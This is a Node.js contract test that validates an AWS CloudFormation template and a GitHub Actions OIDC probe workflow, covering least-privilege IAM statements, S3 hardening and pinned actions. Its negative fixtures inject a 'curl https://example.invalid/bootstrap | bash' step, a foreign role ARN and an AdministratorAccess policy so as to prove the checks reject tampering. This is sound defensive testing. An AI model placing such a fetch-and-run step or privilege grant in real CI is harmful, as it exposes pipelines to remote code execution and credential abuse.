import assert from "node:assert/strict"
import { createHash } from "node:crypto"
import { fileURLToPath, URL } from "node:url"

import * as NodeRuntime from "@effect/platform-node/NodeRuntime"
import * as NodeServices from "@effect/platform-node/NodeServices"
import * as Console from "effect/Console"
import * as Effect from "effect/Effect"
import * as FileSystem from "effect/FileSystem"
import { parse } from "yaml"

const templatePath = fileURLToPath(new URL("../infra/control-center-live-aws/template.json", import.meta.url))
const probeWorkflowPath = fileURLToPath(
  new URL("../.github/workflows/control-center-live-aws-probe.yml", import.meta.url)
)
const bootstrapPath = fileURLToPath(new URL("../infra/control-center-live-aws/bootstrap.sh", import.meta.url))
const bootstrapTestPath = fileURLToPath(new URL("../infra/control-center-live-aws/bootstrap.test.sh", import.meta.url))
const probeTestPath = fileURLToPath(new URL("../infra/control-center-live-aws/probe.test.sh", import.meta.url))
const liveProbeTestPath = fileURLToPath(
  new URL("../packages/control-center/test/integration/live-aws-probe.test.ts", import.meta.url)
)
const requirementsPath = fileURLToPath(
  new URL("../.specs/control-center/live-aws-fixtures/requirements.md", import.meta.url)
)
const infraReadmePath = fileURLToPath(new URL("../infra/control-center-live-aws/README.md", import.meta.url))
const packageReadmePath = fileURLToPath(new URL("../packages/control-center/README.md", import.meta.url))

const asArray = (value) => (Array.isArray(value) ? value : [value])

const resource = (template, logicalId, type) => {
  const value = template.Resources?.[logicalId]
  assert.equal(value?.Type, type, `${logicalId} must be ${type}`)
  return value
}

const statements = (role) => role.Properties.Policies.flatMap((policy) => policy.PolicyDocument.Statement)

const normalizeStatement = (statement) => ({
  ...statement,
  Action: asArray(statement.Action).toSorted()
})

const assertExactStatements = (actual, expected) => {
  assert.deepEqual(
    actual.map(normalizeStatement).toSorted((left, right) => left.Sid.localeCompare(right.Sid)),
    expected.map(normalizeStatement).toSorted((left, right) => left.Sid.localeCompare(right.Sid))
  )
}

const objectKeys = (value) => Object.keys(value).toSorted()

const runDigest = (value) => createHash("sha256").update(value).digest("hex")

const assertStepShape = (step, expectedKeys) => {
  assert.deepEqual(objectKeys(step), expectedKeys.toSorted())
}

const validatePortableContractTest = (test) => {
  assert.doesNotMatch(test, /(?:^|\n)\s*rg(?:\s|$)/u, "contract tests must not require optional ripgrep")
}

const validateArtifactRetention = (bucket) => {
  const lifecycleRule = bucket.Properties.LifecycleConfiguration.Rules[0]
  const currentDays = lifecycleRule.ExpirationInDays
  assert.ok(Number.isInteger(currentDays) && currentDays > 0 && currentDays <= 7)
  if (bucket.Properties.VersioningConfiguration?.Status !== "Enabled") return
  const noncurrentDays = lifecycleRule.NoncurrentVersionExpiration?.NoncurrentDays
  assert.ok(Number.isInteger(noncurrentDays) && noncurrentDays > 0)
  assert.ok(currentDays + noncurrentDays <= 7, "versioned artifact retention must not exceed seven days")
}

const validateFixtureCoordinateDocumentation = (documents) => {
  const variables = [
    "CONTROL_CENTER_TEST_AWS_ROLE_ARN",
    "CONTROL_CENTER_TEST_AWS_REGION",
    "CONTROL_CENTER_TEST_CODECOMMIT_REPOSITORY",
    "CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE"
  ]
  for (const document of documents) {
    for (const variable of variables) assert.ok(document.includes(variable), `${variable} boundary is required`)
    assert.match(
      document,
      /role\s+ARN\s+is\s+persisted\s+as\s+an\s+owner-visible\s+GitHub\s+environment\s+variable/iu,
      "role ARN storage must name its durable owner-visible GitHub environment boundary"
    )
    assert.doesNotMatch(
      document,
      /(?:role\s+ARN|CONTROL_CENTER_TEST_AWS_ROLE_ARN)[^\n|.]{0,160}must\s+not\s+be\s+persisted/iu,
      "role ARN documentation must not contradict its durable GitHub environment storage"
    )
    for (const boundaryTerm of [
      "security boundary",
      "persistence",
      "permitted authenticated exposure",
      "forbidden surfaces",
      "server-private",
      "owner-visible",
      "safe adapter settings",
      "public responses",
      "aws-cn is intentionally rejected"
    ]) {
      assert.match(
        document,
        new RegExp(boundaryTerm.replaceAll(" ", "\\s+"), "iu"),
        `fixture documentation must classify ${boundaryTerm}`
      )
    }
  }
}

const validateProbeWorkflow = (workflow) => {
  const parsed = parse(workflow)
  assert.deepEqual(objectKeys(parsed), ["concurrency", "jobs", "name", "on", "permissions"])
  assert.equal(parsed.name, "Control Center Live AWS Probe")
  assert.deepEqual(parsed.on, { workflow_dispatch: null })
  assert.deepEqual(parsed.concurrency, {
    group: "control-center-live-aws-probe",
    "cancel-in-progress": true
  })
  assert.deepEqual(parsed.permissions, {})
  assert.deepEqual(objectKeys(parsed.jobs), ["prepare-live-runner", "read-only-probe"])

  const prepareJob = parsed.jobs["prepare-live-runner"]
  const protectedJob = parsed.jobs["read-only-probe"]
  assert.deepEqual(objectKeys(prepareJob), ["name", "outputs", "permissions", "runs-on", "steps", "timeout-minutes"])
  assert.deepEqual(objectKeys(protectedJob), [
    "environment",
    "name",
    "needs",
    "permissions",
    "runs-on",
    "steps",
    "timeout-minutes"
  ])
  const { steps: prepareSteps, ...prepareMetadata } = prepareJob
  const { steps: protectedSteps, ...protectedMetadata } = protectedJob
  assert.deepEqual(prepareMetadata, {
    name: "Build sealed AWS probe runner",
    "runs-on": "ubuntu-latest",
    "timeout-minutes": 15,
    outputs: {
      "runner-sha256": "${{ steps.package-runner.outputs.sha256 }}"
    },
    permissions: {
      contents: "read"
    }
  })
  assert.deepEqual(protectedMetadata, {
    name: "Assume OIDC role through Control Center",
    needs: "prepare-live-runner",
    "runs-on": "ubuntu-latest",
    "timeout-minutes": 10,
    environment: "control-center-live-integration",
    permissions: {
      "id-token": "write"
    }
  })

  const prepareStepKeys = [
    ["name", "uses", "with"],
    ["name", "uses", "with"],
    ["name", "run"],
    ["id", "name", "run", "shell"],
    ["name", "uses", "with"]
  ]
  const protectedStepKeys = [
    ["name", "uses", "with"],
    ["env", "name", "run", "shell"],
    ["name", "uses", "with"],
    ["env", "name", "run", "shell"],
    ["env", "name", "run", "shell"]
  ]
  prepareSteps.forEach((step, index) => assertStepShape(step, prepareStepKeys[index]))
  protectedSteps.forEach((step, index) => assertStepShape(step, protectedStepKeys[index]))

  assert.deepEqual(
    prepareSteps.map(({ run: _, ...step }) => step),
    [
      {
        name: "Checkout",
        uses: "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        with: {
          "persist-credentials": false
        }
      },
      {
        name: "Install dependencies",
        uses: "./.github/actions/setup",
        with: {
          "node-version": "26.7.0"
        }
      },
      {
        name: "Build Control Center and workspace dependencies"
      },
      {
        name: "Package sealed AWS probe runner",
        id: "package-runner",
        shell: "bash"
      },
      {
        name: "Upload sealed AWS probe runner",
        uses: "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
        with: {
          name: "control-center-live-aws-runner-${{ github.sha }}",
          path: "${{ runner.temp }}/control-center-live-aws-runner.tgz",
          "if-no-files-found": "error",
          "retention-days": 1
        }
      }
    ]
  )
  assert.deepEqual(
    protectedSteps.map(({ run: _, ...step }) => step),
    [
      {
        name: "Download sealed AWS probe runner",
        uses: "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
        with: {
          name: "control-center-live-aws-runner-${{ github.sha }}",
          path: "${{ runner.temp }}/control-center-live-aws-artifact"
        }
      },
      {
        name: "Verify sealed AWS probe runner",
        shell: "bash",
        env: {
          EXPECTED_RUNNER_SHA256: "${{ needs.prepare-live-runner.outputs.runner-sha256 }}"
        }
      },
      {
        name: "Assume read-only live-test role",
        uses: "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
        with: {
          "aws-region": "${{ vars.CONTROL_CENTER_TEST_AWS_REGION }}",
          "role-to-assume": "${{ vars.CONTROL_CENTER_TEST_AWS_ROLE_ARN }}",
          "role-session-name": "control-center-live-aws-probe",
          "mask-aws-account-id": true,
          "output-credentials": false,
          "unset-current-credentials": true
        }
      },
      {
        name: "Probe stable read-only fixtures",
        shell: "bash",
        env: {
          FIXTURE_ROLE_ARN: "${{ vars.CONTROL_CENTER_TEST_AWS_ROLE_ARN }}",
          FIXTURE_REPOSITORY: "${{ vars.CONTROL_CENTER_TEST_CODECOMMIT_REPOSITORY }}",
          FIXTURE_PIPELINE: "${{ vars.CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE }}"
        }
      },
      {
        name: "Probe through the Control Center default credential chain",
        shell: "bash",
        env: {
          CONTROL_CENTER_LIVE_AWS_PROBE: "1",
          CONTROL_CENTER_TEST_AWS_ROLE_ARN: "${{ vars.CONTROL_CENTER_TEST_AWS_ROLE_ARN }}",
          CONTROL_CENTER_TEST_AWS_REGION: "${{ vars.CONTROL_CENTER_TEST_AWS_REGION }}",
          CONTROL_CENTER_TEST_CODECOMMIT_REPOSITORY: "${{ vars.CONTROL_CENTER_TEST_CODECOMMIT_REPOSITORY }}",
          CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE: "${{ vars.CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE }}"
        }
      }
    ]
  )

  // Regenerate after reviewing a run block: node -e 'const fs=require("node:fs"),c=require("node:crypto"),y=require("yaml");for(const j of Object.values(y.parse(fs.readFileSync(".github/workflows/control-center-live-aws-probe.yml","utf8")).jobs))for(const s of j.steps)if(s.run)console.log(s.name,c.createHash("sha256").update(s.run).digest("hex"))'
  const expectedRunDigests = new Map([
    [
      "Build Control Center and workspace dependencies",
      "88cf32b2cb19e95cace7bc646e06cb91934420e73a9dc32524880b02d77883e8"
    ],
    ["Package sealed AWS probe runner", "4234a86218c975e5f1e9c42632b72926d1127e119f5c6591b2af283095450102"],
    ["Verify sealed AWS probe runner", "5a84a92f8adb4b83c4820fcab6a3b7c39db11cc9ef33d8bc7d0c8d184a386744"],
    ["Probe stable read-only fixtures", "32baf1272ba5e5497ebb5d0121a043a16a54fef371d7b9a8706512da1d3342fe"],
    [
      "Probe through the Control Center default credential chain",
      "f8503e3fae81a4c057fdc8298eaed75def97635d7916bf2bb3302a787ce3db6e"
    ]
  ])
  for (const step of [...prepareSteps, ...protectedSteps]) {
    if (step.run === undefined) continue
    assert.equal(runDigest(step.run), expectedRunDigests.get(step.name))
  }

  const externalActions = [...prepareSteps, ...protectedSteps]
    .map(({ uses }) => uses)
    .filter((uses) => uses !== undefined && !uses.startsWith("./"))
  assert.deepEqual(externalActions, [
    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
    "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
    "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c"
  ])
  for (const action of externalActions) {
    assert.match(action, /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+@[0-9a-f]{40}$/u)
  }
}

const expectWorkflowInvalid = (workflow, mutate) => {
  const fixture = mutate(workflow)
  assert.notEqual(fixture, workflow, "workflow negative fixture must change its input")
  assert.throws(() => validateProbeWorkflow(fixture))
}

const validate = (template) => {
  assert.equal(template.AWSTemplateFormatVersion, "2010-09-09")
  assert.ok(template.Conditions?.CreateGitHubOidcProvider)
  assert.deepEqual(Object.keys(template.Parameters), ["ExistingGitHubOidcProviderArn"])

  const oidcProvider = resource(template, "GitHubOidcProvider", "AWS::IAM::OIDCProvider")
  assert.equal(oidcProvider.Condition, "CreateGitHubOidcProvider")
  assert.equal(oidcProvider.DeletionPolicy, "Retain")
  assert.equal(oidcProvider.UpdateReplacePolicy, "Retain")
  assert.equal(oidcProvider.Properties.Url, "https://token.actions.githubusercontent.com")
  assert.deepEqual(oidcProvider.Properties.ClientIdList, ["sts.amazonaws.com"])

  const role = resource(template, "LiveIntegrationRole", "AWS::IAM::Role")
  assert.equal(role.Properties.MaxSessionDuration, 3600)
  assert.equal(role.Properties.ManagedPolicyArns, undefined)
  assert.deepEqual(role.Properties.AssumeRolePolicyDocument.Statement, [
    {
      Effect: "Allow",
      Principal: {
        Federated: {
          "Fn::If": [
            "CreateGitHubOidcProvider",
            {
              Ref: "GitHubOidcProvider"
            },
            {
              Ref: "ExistingGitHubOidcProviderArn"
            }
          ]
        }
      },
      Action: "sts:AssumeRoleWithWebIdentity",
      Condition: {
        StringEquals: {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:knpkv/npm:environment:control-center-live-integration"
        }
      }
    }
  ])
  assertExactStatements(statements(role), [
    {
      Sid: "Identity",
      Effect: "Allow",
      Action: ["sts:GetCallerIdentity"],
      Resource: "*"
    },
    {
      Sid: "ListProviderResources",
      Effect: "Allow",
      Action: ["codecommit:ListRepositories", "codepipeline:ListPipelines"],
      Resource: "*"
    },
    {
      Sid: "ReadFixtureRepository",
      Effect: "Allow",
      Action: [
        "codecommit:GetBlob",
        "codecommit:GetDifferences",
        "codecommit:GetPullRequest",
        "codecommit:GetRepository",
        "codecommit:ListPullRequests"
      ],
      Resource: {
        "Fn::GetAtt": ["FixtureRepository", "Arn"]
      }
    },
    {
      Sid: "ReadFixturePipeline",
      Effect: "Allow",
      Action: [
        "codepipeline:GetPipeline",
        "codepipeline:GetPipelineExecution",
        "codepipeline:GetPipelineState",
        "codepipeline:ListActionExecutions",
        "codepipeline:ListPipelineExecutions"
      ],
      Resource: {
        "Fn::Sub": "arn:${AWS::Partition}:codepipeline:${AWS::Region}:${AWS::AccountId}:${FixturePipeline}"
      }
    }
  ])

  const repository = resource(template, "FixtureRepository", "AWS::CodeCommit::Repository")
  assert.equal(repository.Properties.RepositoryName, "control-center-live-fixture")

  const bucket = resource(template, "ArtifactBucket", "AWS::S3::Bucket")
  assert.equal(bucket.DeletionPolicy, "Retain")
  assert.equal(bucket.UpdateReplacePolicy, "Retain")
  assert.deepEqual(bucket.Properties.PublicAccessBlockConfiguration, {
    BlockPublicAcls: true,
    BlockPublicPolicy: true,
    IgnorePublicAcls: true,
    RestrictPublicBuckets: true
  })
  assert.equal(
    bucket.Properties.BucketEncryption.ServerSideEncryptionConfiguration[0].ServerSideEncryptionByDefault.SSEAlgorithm,
    "AES256"
  )
  assert.equal(bucket.Properties.VersioningConfiguration.Status, "Enabled")
  validateArtifactRetention(bucket)
  assert.deepEqual(bucket.Properties.OwnershipControls, {
    Rules: [
      {
        ObjectOwnership: "BucketOwnerEnforced"
      }
    ]
  })
  assert.deepEqual(bucket.Properties.LifecycleConfiguration, {
    Rules: [
      {
        Id: "ExpireFixtureArtifacts",
        Status: "Enabled",
        ExpirationInDays: 1,
        NoncurrentVersionExpiration: {
          NoncurrentDays: 6
        }
      }
    ]
  })

  const bucketPolicy = resource(template, "ArtifactBucketPolicy", "AWS::S3::BucketPolicy")
  assert.equal(bucketPolicy.DeletionPolicy, "Retain")
  assert.equal(bucketPolicy.UpdateReplacePolicy, "Retain")
  assert.deepEqual(bucketPolicy.Properties.PolicyDocument.Statement, [
    {
      Sid: "DenyInsecureTransport",
      Effect: "Deny",
      Principal: "*",
      Action: "s3:*",
      Resource: [
        {
          "Fn::GetAtt": ["ArtifactBucket", "Arn"]
        },
        {
          "Fn::Sub": "${ArtifactBucket.Arn}/*"
        }
      ],
      Condition: {
        Bool: {
          "aws:SecureTransport": "false"
        }
      }
    }
  ])

  const pipelineRole = resource(template, "PipelineRole", "AWS::IAM::Role")
  assert.equal(pipelineRole.Properties.ManagedPolicyArns, undefined)
  assert.deepEqual(pipelineRole.Properties.AssumeRolePolicyDocument, {
    Version: "2012-10-17",
    Statement: [
      {
        Effect: "Allow",
        Principal: {
          Service: "codepipeline.amazonaws.com"
        },
        Action: "sts:AssumeRole"
      }
    ]
  })
  assertExactStatements(statements(pipelineRole), [
    {
      Sid: "ReadFixtureSource",
      Effect: "Allow",
      Action: [
        "codecommit:CancelUploadArchive",
        "codecommit:GetBranch",
        "codecommit:GetCommit",
        "codecommit:GetRepository",
        "codecommit:GetUploadArchiveStatus",
        "codecommit:UploadArchive"
      ],
      Resource: {
        "Fn::GetAtt": ["FixtureRepository", "Arn"]
      }
    },
    {
      Sid: "ReadArtifactBucketMetadata",
      Effect: "Allow",
      Action: ["s3:GetBucketAcl", "s3:GetBucketLocation", "s3:GetBucketVersioning"],
      Resource: {
        "Fn::GetAtt": ["ArtifactBucket", "Arn"]
      }
    },
    {
      Sid: "UseArtifactObjects",
      Effect: "Allow",
      Action: ["s3:GetObject", "s3:GetObjectVersion", "s3:PutObject"],
      Resource: {
        "Fn::Sub": "${ArtifactBucket.Arn}/*"
      }
    }
  ])
  assert.deepEqual(
    Object.entries(template.Resources)
      .filter(([, value]) => value.Type.startsWith("AWS::IAM::"))
      .map(([logicalId, value]) => [logicalId, value.Type])
      .toSorted(([left], [right]) => left.localeCompare(right)),
    [
      ["GitHubOidcProvider", "AWS::IAM::OIDCProvider"],
      ["LiveIntegrationRole", "AWS::IAM::Role"],
      ["PipelineRole", "AWS::IAM::Role"]
    ]
  )

  const pipeline = resource(template, "FixturePipeline", "AWS::CodePipeline::Pipeline")
  assert.equal(pipeline.Properties.PipelineType, "V1")
  assert.equal(pipeline.Properties.RestartExecutionOnUpdate, false)
  const source = pipeline.Properties.Stages.flatMap((stage) => stage.Actions).find(
    (action) => action.ActionTypeId.Provider === "CodeCommit"
  )
  assert.ok(source, "CodeCommit source action is required")
  assert.equal(source.Configuration.BranchName, "main")
  assert.equal(source.Configuration.PollForSourceChanges, "false")
  assert.deepEqual(source.Configuration.RepositoryName, {
    "Fn::GetAtt": ["FixtureRepository", "Name"]
  })
  const approval = pipeline.Properties.Stages.flatMap((stage) => stage.Actions).find(
    (action) => action.ActionTypeId.Provider === "Manual"
  )
  assert.ok(approval, "manual approval action is required")

  for (const output of ["AwsRoleArn", "AwsRegion", "CodeCommitRepository", "CodePipelinePipeline"]) {
    assert.ok(template.Outputs?.[output], `${output} output is required`)
  }
}

const expectInvalid = (template, mutate) => {
  const fixture = JSON.parse(JSON.stringify(template))
  mutate(fixture)
  assert.throws(() => validate(fixture))
}

const program = Effect.gen(function* () {
  const fileSystem = yield* FileSystem.FileSystem
  const template = JSON.parse(yield* fileSystem.readFileString(templatePath))
  validate(template)

  const coordinateDocuments = yield* Effect.all([
    fileSystem.readFileString(requirementsPath),
    fileSystem.readFileString(infraReadmePath),
    fileSystem.readFileString(packageReadmePath)
  ])
  validateFixtureCoordinateDocumentation(coordinateDocuments)
  const nonSecretOnlyFixture = coordinateDocuments.map(() =>
    [
      "CONTROL_CENTER_TEST_AWS_ROLE_ARN",
      "CONTROL_CENTER_TEST_AWS_REGION",
      "CONTROL_CENTER_TEST_CODECOMMIT_REPOSITORY",
      "CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE",
      "These values are non-secret."
    ].join("\n")
  )
  assert.throws(() => validateFixtureCoordinateDocumentation(nonSecretOnlyFixture))
  const contradictoryRoleArnFixture = coordinateDocuments.map((document) =>
    document.replace(
      /role\s+ARN\s+is\s+persisted\s+as\s+an\s+owner-visible\s+GitHub\s+environment\s+variable/iu,
      "role ARN must not be persisted"
    )
  )
  assert.throws(() => validateFixtureCoordinateDocumentation(contradictoryRoleArnFixture))

  const overlongVersionedRetention = JSON.parse(JSON.stringify(template.Resources.ArtifactBucket))
  overlongVersionedRetention.Properties.LifecycleConfiguration.Rules[0].ExpirationInDays = 7
  overlongVersionedRetention.Properties.LifecycleConfiguration.Rules[0].NoncurrentVersionExpiration.NoncurrentDays = 7
  assert.throws(() => validateArtifactRetention(overlongVersionedRetention))

  const boundedVersionedRetention = JSON.parse(JSON.stringify(template.Resources.ArtifactBucket))
  assert.doesNotThrow(() => validateArtifactRetention(boundedVersionedRetention))

  const boundedUnversionedRetention = JSON.parse(JSON.stringify(template.Resources.ArtifactBucket))
  delete boundedUnversionedRetention.Properties.VersioningConfiguration
  boundedUnversionedRetention.Properties.LifecycleConfiguration.Rules[0].ExpirationInDays = 7
  delete boundedUnversionedRetention.Properties.LifecycleConfiguration.Rules[0].NoncurrentVersionExpiration
  assert.doesNotThrow(() => validateArtifactRetention(boundedUnversionedRetention))

  expectInvalid(template, (fixture) => {
    fixture.Resources.LiveIntegrationRole.Properties.Policies[0].PolicyDocument.Statement[2].Action.push(
      "codecommit:GetBranch"
    )
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.LiveIntegrationRole.Properties.Policies[0].PolicyDocument.Statement[2].Action.push(
      "codecommit:Get*"
    )
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.LiveIntegrationRole.Properties.Policies[0].PolicyDocument.Statement[2].Resource = [
      "*",
      {
        "Fn::GetAtt": ["FixtureRepository", "Arn"]
      }
    ]
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.LiveIntegrationRole.Properties.AssumeRolePolicyDocument.Statement[0].Principal.Federated =
      "arn:aws:iam::123456789012:oidc-provider/foreign.example"
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.LiveIntegrationRole.Properties.AssumeRolePolicyDocument.Statement[0].Effect = "Deny"
  })
  for (const subject of [
    "repo:other/npm:environment:control-center-live-integration",
    "repo:knpkv/fork:environment:control-center-live-integration",
    "repo:knpkv/npm:environment:other"
  ]) {
    expectInvalid(template, (fixture) => {
      fixture.Resources.LiveIntegrationRole.Properties.AssumeRolePolicyDocument.Statement[0].Condition.StringEquals[
        "token.actions.githubusercontent.com:sub"
      ] = subject
    })
  }
  expectInvalid(template, (fixture) => {
    fixture.Resources.LiveIntegrationRole.Properties.ManagedPolicyArns = ["arn:aws:iam::aws:policy/AdministratorAccess"]
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ExtraRolePolicy = {
      Type: "AWS::IAM::Policy",
      Properties: {
        PolicyName: "extra",
        Roles: [{ Ref: "LiveIntegrationRole" }],
        PolicyDocument: {
          Version: "2012-10-17",
          Statement: []
        }
      }
    }
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.PipelineRole.Properties.AssumeRolePolicyDocument.Statement[0].Principal.Service = "*"
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.PipelineRole.Properties.Policies[0].PolicyDocument.Statement[1].Action =
      fixture.Resources.PipelineRole.Properties.Policies[0].PolicyDocument.Statement[1].Action.filter(
        (action) => action !== "s3:GetBucketAcl"
      )
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.PipelineRole.Properties.Policies[0].PolicyDocument.Statement[1].Action =
      fixture.Resources.PipelineRole.Properties.Policies[0].PolicyDocument.Statement[1].Action.filter(
        (action) => action !== "s3:GetBucketLocation"
      )
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.PipelineRole.Properties.Policies[0].PolicyDocument.Statement[1].Resource = {
      "Fn::Sub": "${ArtifactBucket.Arn}/*"
    }
  })
  expectInvalid(template, (fixture) => {
    delete fixture.Resources.ArtifactBucketPolicy.DeletionPolicy
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucketPolicy.Properties.PolicyDocument.Statement[0].Condition.Bool[
      "aws:SecureTransport"
    ] = "true"
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucketPolicy.Properties.PolicyDocument.Statement[0].Resource.pop()
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucketPolicy.Properties.PolicyDocument.Statement[0].Effect = "Allow"
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.FixturePipeline.Properties.Stages[0].Actions[0].Configuration.PollForSourceChanges = "true"
  })
  expectInvalid(template, (fixture) => {
    delete fixture.Resources.GitHubOidcProvider.DeletionPolicy
  })
  expectInvalid(template, (fixture) => {
    delete fixture.Resources.GitHubOidcProvider.UpdateReplacePolicy
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucket.Properties.PublicAccessBlockConfiguration.BlockPublicPolicy = false
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucket.Properties.OwnershipControls.Rules[0].ObjectOwnership = "ObjectWriter"
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucket.Properties.LifecycleConfiguration.Rules[0].ExpirationInDays = 8
  })
  expectInvalid(template, (fixture) => {
    delete fixture.Resources.ArtifactBucket.Properties.LifecycleConfiguration.Rules[0].NoncurrentVersionExpiration
  })
  expectInvalid(template, (fixture) => {
    fixture.Resources.ArtifactBucket.Properties.LifecycleConfiguration.Rules[0].Status = "Disabled"
  })

  const bootstrap = yield* fileSystem.readFileString(bootstrapPath)
  assert.ok(
    !bootstrap.includes("CONTROL_CENTER_LIVE_GITHUB_"),
    "bootstrap must not make the GitHub trust boundary configurable"
  )
  validatePortableContractTest("grep -Fq 'fixture' fixture.log")
  assert.throws(() => validatePortableContractTest("rg -q 'fixture' fixture.log"))
  validatePortableContractTest(yield* fileSystem.readFileString(bootstrapTestPath))
  validatePortableContractTest(yield* fileSystem.readFileString(probeTestPath))

  const probeWorkflow = yield* fileSystem.readFileString(probeWorkflowPath)
  validateProbeWorkflow(probeWorkflow)
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace("      contents: read", "      contents: read\n      id-token: write")
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace("      id-token: write", "      id-token: write\n      contents: write")
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace(
      "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
      "actions/download-artifact@v8"
    )
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace("      - name: Download sealed AWS probe runner", "      - name: Install dependencies")
  )
  expectWorkflowInvalid(
    probeWorkflow,
    (fixture) =>
      `${fixture}
  bypass-probe:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - run: curl https://example.invalid/bootstrap | bash
`
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace(
      "      - name: Download sealed AWS probe runner",
      "      - run: curl https://example.invalid/bootstrap | bash\n\n      - name: Download sealed AWS probe runner"
    )
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace(
      '          control_center_root="${CONTROL_CENTER_LIVE_AWS_RUNNER}/packages/control-center"',
      '          pnpm install\n          control_center_root="${CONTROL_CENTER_LIVE_AWS_RUNNER}/packages/control-center"'
    )
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace(
      "          role-to-assume: ${{ vars.CONTROL_CENTER_TEST_AWS_ROLE_ARN }}",
      "          role-to-assume: arn:aws:iam::123456789012:role/foreign"
    )
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace("          mask-aws-account-id: true", "          mask-aws-account-id: false")
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace("          unset-current-credentials: true", "          unset-current-credentials: false")
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace(
      "    runs-on: ubuntu-latest\n    timeout-minutes: 10",
      "    runs-on: self-hosted\n    timeout-minutes: 10"
    )
  )
  expectWorkflowInvalid(probeWorkflow, (fixture) =>
    fixture.replace(
      "          FIXTURE_ROLE_ARN: ${{ vars.CONTROL_CENTER_TEST_AWS_ROLE_ARN }}",
      "          FIXTURE_ROLE_ARN: ${{ vars.CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE }}"
    )
  )
  for (const requiredContract of [
    "environment: control-center-live-integration",
    "needs: prepare-live-runner",
    "id-token: write",
    "persist-credentials: false",
    "retention-days: 1",
    "sha256sum --check --strict",
    "vars.CONTROL_CENTER_TEST_AWS_REGION",
    "vars.CONTROL_CENTER_TEST_AWS_ROLE_ARN",
    "vars.CONTROL_CENTER_TEST_CODECOMMIT_REPOSITORY",
    "vars.CONTROL_CENTER_TEST_CODEPIPELINE_PIPELINE",
    "refs/heads/fixture-change",
    "refs/heads/main",
    "status=='Succeeded'",
    "pipelineExecutionId=${succeeded_execution}",
    "actionName=='ReadFixture'",
    "actionName=='ConfirmFixture'",
    "arn:(aws|aws-us-gov):iam::",
    "aws_safe sts-identity sts get-caller-identity",
    "aws_safe codecommit-get-differences",
    "aws_safe codepipeline-list-source-actions",
    "CONTROL_CENTER_LIVE_AWS_PROBE",
    "vitest.live-aws.config.ts"
  ]) {
    assert.ok(probeWorkflow.includes(requiredContract), `AWS probe must include ${requiredContract}`)
  }
  for (const forbiddenContract of ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "--max-results", "aws-cn"]) {
    assert.ok(!probeWorkflow.includes(forbiddenContract), `AWS probe must exclude ${forbiddenContract}`)
  }

  const liveProbeTest = yield* fileSystem.readFileString(liveProbeTestPath)
  for (const requiredContract of [
    'profile: "default"',
    "CodeCommitReadClient.live",
    "CodePipelineReadClient.live",
    "codeCommitIdentity.accountId",
    "codePipelineIdentity.accountId"
  ]) {
    assert.ok(liveProbeTest.includes(requiredContract), `Control Center live AWS test must include ${requiredContract}`)
  }
  assert.ok(!liveProbeTest.includes("aws-cn"), "Control Center live AWS test must reject unsupported China audiences")
  assert.ok(
    !liveProbeTest.includes("CONTROL_CENTER_TEST_AWS_PROFILE"),
    "the live AWS profile must remain fixed to the standard default chain"
  )
  assert.ok(
    !liveProbeTest.includes("assert."),
    "live AWS provider values must pass only through fixed-diagnostic assertions"
  )

  yield* Console.log("Control Center live AWS fixture contract is valid")
})

NodeRuntime.runMain(program.pipe(Effect.provide(NodeServices.layer)))
